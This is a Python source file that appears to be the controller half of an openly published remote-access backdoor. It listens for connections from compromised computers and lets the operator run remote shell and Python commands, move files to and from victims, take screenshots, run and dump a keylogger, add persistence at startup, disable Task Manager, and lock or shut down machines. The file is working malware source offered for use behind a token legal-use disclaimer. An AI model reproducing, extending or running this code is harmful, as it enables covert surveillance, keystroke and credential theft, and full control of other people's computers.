'''
Python backdoor by xp4xbox
https://github.com/xp4xbox/Python-Backdoor
https://www.instructables.com/id/Simple-Python-Backdoor/

License: https://github.com/xp4xbox/Python-Backdoor/blob/master/license

NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
'''

import socket, os, time, threading, sys, json
from queue import Queue

intThreads = 2
arrJobs = [1, 2]
queue = Queue()

arrAddresses = []
arrConnections = []

strHost = "0.0.0.0"
intPort = 3000

intBuff = 1024

# function to return decoded utf-8
decode_utf8 = lambda data: data.decode("utf-8", errors="replace")

# function to return string with quotes removed
remove_quotes = lambda string: string.replace("\"", "")

# function to return title centered around string
center = lambda string, title: f"{{:^{len(string)}}}".format(title)

# function to send encrypted data
send = lambda data: conn.send(data)

# function to receive and decrypt data
recv = lambda buffer: conn.recv(buffer)


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while True:
        bytPart = recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart
        if len(bytData) == buffer:
            return bytData


def create_socket():
    global objSocket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse a socket even if its recently closed
    except socket.error() as strError:
        print(f"Error creating socket {strError}")


def socket_bind():
    global objSocket
    try:
        print(f"Listening on port {intPort}")
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)
    except socket.error() as strError:
        print(f"Error binding socket {strError} Retrying...")
        socket_bind()


def socket_accept():
    while True:
        try:
            conn, address = objSocket.accept()
            conn.setblocking(1)  # no timeout
            address += tuple(json.loads(decode_utf8(conn.recv(intBuff))))
            arrConnections.append(conn)
            arrAddresses.append(address)
            print("\nConnection has been established: {0} ({1})".format(address[0], address[2]))
        except socket.error:
            print("Error accepting connections!")
            continue


def menu_help():
    print("\n--help")
    print("--l List all connections")
    print("--i Interact with connection")
    print("--e Open remote cmd with connection")
    print("--s Send command to every connection")
    print("--c Close connection")
    print("--x Exit and close all connections")


def main_menu():
    while True:
        strChoice = input("\n>> ")

        refresh_connections()  # refresh connection list

        if strChoice == "--l":
            list_connections()

        elif strChoice[:3] == "--i" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "True")
            if conn is not None:
                send_commands()
        elif strChoice == "--help":
            menu_help()

        elif strChoice[:3] == "--c" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "False")
            if conn is not None:
                send(str.encode("exit"))
                conn.close()

        elif strChoice == "--x":
            close()
            break  # break to continue work() function

        elif strChoice[:3] == "--e" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "False")
            if conn is not None:
                command_shell()

        elif strChoice[:3] == "--s" and len(strChoice) > 3:
            send_command_all(strChoice[4:])
        else:
            print("Invalid choice, please try again!")
            menu_help()


def close():
    global arrConnections, arrAddresses

    if len(arrAddresses) == 0:  # if there are no computers connected
        return

    for _, conn in enumerate(arrConnections):
        conn.send(str.encode("exit"))
        conn.close()
    del arrConnections
    arrConnections = []
    del arrAddresses
    arrAddresses = []


def refresh_connections():  # used to remove any lost connections
    global arrConnections, arrAddresses
    for intCounter, conn in enumerate(arrConnections):
        try:
            conn.send(str.encode("test"))  # test to see if connection is active
        except socket.error:
            del arrAddresses[arrConnections.index(conn)]
            arrConnections.remove(conn)
            conn.close()


def list_connections():
    refresh_connections()

    if not len(arrConnections) > 0:
        print("No connections.")
        return

    strClients = ""
    for intCounter, arrAddress in enumerate(arrAddresses):
        strClients += str(intCounter)
        for value in arrAddress:
            strClients += f"{4 * ' '}{str(value)}"
        strClients += "\n"

    strInfo = f"\nID{3 * ' '}"
    for index, text in enumerate(["IP", "Port", "PC Name", "OS", "User"]):
        strInfo += center(str(arrAddresses[0][index]), text) + 4 * " "
    strInfo += f"\n{strClients}"
    print(strInfo, end='')


def select_connection(connection_id, blnGetResponse):
    global conn, arrInfo
    try:
        connection_id = int(connection_id)
        conn = arrConnections[connection_id]
    except:
        print("Invalid choice, please try again!")
        return
    else:
        '''
        IP, PC Name, OS, User
        '''
        arrInfo = tuple()
        for index in [0, 2, 3, 4]:
            arrInfo += (str(arrAddresses[connection_id][index]),)

        if blnGetResponse == "True":
            print(f"You are connected to {arrInfo[0]} ....\n")
        return conn


def send_command_all(command):
    if os.path.isfile("command_log.txt"):
        open("command_log.txt", "w").close()  # clear previous log contents

    for intCounter in range(0, len(arrAddresses)):
        conn = select_connection(intCounter, "False")

        if conn is not None and command != "cmd":
            send_command(command)


def user_info():
    for index, text in enumerate(["IP: ", "PC Name: ", "OS: ", "User: "]):
        print(text + arrInfo[index])


def screenshot():
    send(str.encode("screen"))
    strScrnSize = decode_utf8(recv(intBuff))  # get screenshot size
    print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")

    intBuffer = int(strScrnSize)

    strFile = time.strftime("%Y%m%d%H%M%S.png")

    ScrnData = recvall(intBuffer)  # get data and write it
    with open(strFile, "wb") as objPic:
        objPic.write(ScrnData)

    print(f"Done!!!\nTotal bytes received: {str(os.path.getsize(strFile))} bytes")


def browse_files():
    send(str.encode("filebrowser"))
    print("\nDrives :")

    strDrives = decode_utf8(recv(intBuff))
    print(f"{strDrives}\n")

    strDir = input("Directory: ")

    if strDir == "":
        # tell the client of the invalid directory
        strDir = "Invalid"

    send(str.encode(strDir))

    strClientResponse = decode_utf8(recv(intBuff))  # get buffer size

    if strClientResponse == "Invalid Directory!":  # if the directory is invalid
        print(f"\n{strClientResponse}")
        return

    intBuffer = int(strClientResponse)
    strClientResponse = decode_utf8(recvall(intBuffer))  # receive full data

    print(f"\n{strClientResponse}")


def startup():
    send(str.encode("startup"))
    print("Registering ...")

    strClientResponse = decode_utf8(recv(intBuff))
    if not strClientResponse == "success":
        print(strClientResponse)


def remove_from_startup():
    send(str.encode("rmvstartup"))
    print("Removing ...")

    strClientResponse = decode_utf8(recv(intBuff))
    if not strClientResponse == "success":
        print(strClientResponse)


def send_file():
    strFile = remove_quotes(input("\nFile to send: "))
    if not os.path.isfile(strFile):
        print("Invalid File!")
        return

    strOutputFile = remove_quotes(input("\nOutput File: "))
    if strOutputFile == "":  # if the input is blank
        return

    send(str.encode(f"send{str(os.path.getsize(strFile))}"))

    time.sleep(1)
    with open(strFile, "rb") as objFile:
        send(objFile.read())

    send(str.encode(strOutputFile))

    print(f"Total bytes sent: {str(os.path.getsize(strFile))}")

    strClientResponse = decode_utf8(recv(intBuff))
    print(strClientResponse)


def receive():
    strFile = remove_quotes(input("\nTarget file: "))
    strFileOutput = remove_quotes(input("\nOutput File: "))

    if strFile == "" or strFileOutput == "":  # if the user left an input blank
        return

    send(str.encode("recv" + strFile))
    strClientResponse = decode_utf8(recv(intBuff))

    if strClientResponse == "Target file not found!":
        print(strClientResponse)
        return

    print(f"File size: {strClientResponse} bytes\nPlease wait...")
    intBuffer = int(strClientResponse)

    file_data = recvall(intBuffer)  # get data and write it

    try:
        with open(strFileOutput, "wb") as objFile:
            objFile.write(file_data)
    except:
        print("Path is protected/invalid!")
        return

    print(f"Done!!!\nTotal bytes received: {str(os.path.getsize(strFileOutput))} bytes")


def command_shell():  # remote cmd shell
    send(str.encode("cmd"))
    strDefault = f"\n{decode_utf8(recv(intBuff))}>"
    print(strDefault, end="")  # print default prompt

    while True:
        strCommand = input()
        if strCommand in ["quit", "exit"]:
            send(str.encode("goback"))
            break

        elif strCommand == "cmd":  # commands that do not work
            print("Please do use not this command!")
            print(strDefault, end="")

        elif len(strCommand) > 0:
            send(str.encode(strCommand))
            intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
            strClientResponse = decode_utf8(recvall(intBuffer))
            print(strClientResponse, end="")  # print cmd output
        else:
            print(strDefault, end="")


def python_interpreter():
    send(str.encode("python"))
    recv(intBuff)
    while True:
        strCommand = input("\n" + ">>> ")
        if strCommand.strip() == "":
            continue
        if strCommand == "exit" or strCommand == "exit()":
            break
        send(strCommand.encode())
        strReceived = recv(intBuff).decode("utf-8").rstrip("\n")
        if strReceived != "":
            print(strReceived)
    send(str.encode("exit"))
    recv(intBuff)


def disable_taskmgr():
    send(str.encode("dtaskmgr"))
    print(decode_utf8(recv(intBuff)))  # print response


def keylogger(option):
    if option == "start":
        send(str.encode("keystart"))
        if decode_utf8(recv(intBuff)) == "error":
            print("Keylogger is already running.")

    elif option == "stop":
        send(str.encode("keystop"))
        if decode_utf8(recv(intBuff)) == "error":
            print("Keylogger is not running.")

    elif option == "dump":
        send(str.encode("keydump"))
        intBuffer = decode_utf8(recv(intBuff))

        if intBuffer == "error":
            print("Keylogger is not running.")
        elif intBuffer == "error2":
            print("No logs.")
        else:
            strLogs = decode_utf8(recvall(int(intBuffer)))  # get all data
            print(f"\n{strLogs}")


def send_command(command):
    send(str.encode("runcmd" + command))
    intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size

    strClientResponse = f"{24 * '='}\n{arrInfo[0]}{4 * ' '}{arrInfo[1]}{decode_utf8(recvall(intBuffer))}{24 * '='}"

    if os.path.isfile("command_log.txt"):
        strMode = "a"
    else:
        strMode = "w"

    with open("command_log.txt", strMode) as objLogFile:
        objLogFile.write(f"{strClientResponse}\n\n")


def show_help():
    print("--help")
    print("--m Send message")
    print("--r Receive file from the user")
    print("--s Send file to the user")
    print("--p Take screenshot")
    print("--a (1) Add to startup")
    print("--a (2) Remove from startup")
    print("--v View files")
    print("--u User Info")
    print("--e Open remote cmd")
    print("--i Open remote python interpreter")
    print("--d Disable task manager")
    print("--k (start) (stop) (dump) Keylogger")
    print("--x (1) Lock user")
    print("--x (2) Restart user")
    print("--x (3) Shutdown user")
    print("--b Move connection to background")
    print("--c Close connection")


def send_commands():
    show_help()
    try:
        while True:
            strChoice = input("\nType selection: ")

            if strChoice == "--help":
                print()
                show_help()
            elif strChoice == "--c":
                send(str.encode("exit"))
                conn.close()
                break
            elif strChoice[:3] == "--m" and len(strChoice) > 3:
                strMsg = "msg" + strChoice[4:]
                send(str.encode(strMsg))
            elif strChoice == "--a 1":
                startup()
            elif strChoice == "--a 2":
                remove_from_startup()
            elif strChoice == "--u":
                user_info()
            elif strChoice == "--p":
                screenshot()
            elif strChoice == "--i":
                python_interpreter()
            elif strChoice == "--v":
                browse_files()
            elif strChoice == "--s":
                send_file()
            elif strChoice == "--r":
                receive()
            elif strChoice == "--x 1":
                send(str.encode("lock"))
            elif strChoice == "--x 2":
                send(str.encode("shutdown"))
                conn.close()
                break
            elif strChoice == "--x 3":
                send(str.encode("restart"))
                conn.close()
                break
            elif strChoice == "--b":
                break
            elif strChoice == "--e":
                command_shell()
            elif strChoice == "--d":
                disable_taskmgr()
            elif strChoice == "--k start":
                keylogger("start")
            elif strChoice == "--k stop":
                keylogger("stop")
            elif strChoice == "--k dump":
                keylogger("dump")
            else:
                print("Invalid choice, please try again!")

    except socket.error as e:  # if there is a socket error
        print(f"Error, connection was lost! :\n{str(e)}")
        return


def create_threads():
    for _ in range(intThreads):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()


def work():  # do jobs in the queue
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_socket()
            socket_bind()
            socket_accept()
        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(arrAddresses) > 0:
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThread in arrJobs:
        queue.put(intThread)  # put thread id into list
    queue.join()


create_threads()
create_jobs()